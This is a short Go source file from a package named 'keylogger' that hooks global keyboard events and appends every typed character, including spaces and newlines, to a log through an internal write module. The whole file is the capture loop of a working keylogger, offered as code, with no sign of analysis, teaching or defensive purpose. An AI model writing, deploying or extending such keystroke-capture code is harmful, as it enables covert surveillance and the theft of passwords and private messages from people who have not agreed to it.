package keylogger

import (
	"unicode"

	"github.com/Tom5521/keylogger/internal/write"
	hook "github.com/robotn/gohook"
)

func Init() {
	sChan := hook.Start()
	defer hook.End()
	for s := range sChan {
		if s.Keychar == 0 {
			continue
		}
		if unicode.IsSpace(s.Keychar) {
			write.Append(string(s.Keychar))
			continue
		}
		if s.Keychar == 13 {
			write.Append("\n")
		}
		if unicode.IsGraphic(s.Keychar) {
			write.Append(string(s.Keychar))
		}
	}
}
